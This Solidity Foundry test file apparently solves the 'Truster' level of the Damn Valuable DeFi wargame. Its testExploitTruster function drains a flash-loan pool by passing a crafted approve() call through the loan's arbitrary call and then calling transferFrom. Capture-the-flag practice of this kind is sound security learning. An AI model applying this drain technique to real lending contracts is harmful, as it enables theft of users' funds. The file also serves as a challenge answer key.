// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "test/utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "src/DamnValuableToken.sol";
import {TrusterLenderPool} from "src/truster/TrusterLenderPool.sol";

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploitTruster() public {
        bytes memory approve = abi.encodeWithSignature("approve(address,uint256)", attacker, type(uint256).max);
        trusterLenderPool.flashLoan(0, attacker, address(dvt), approve);
        vm.prank(attacker);
        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);

        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() view internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}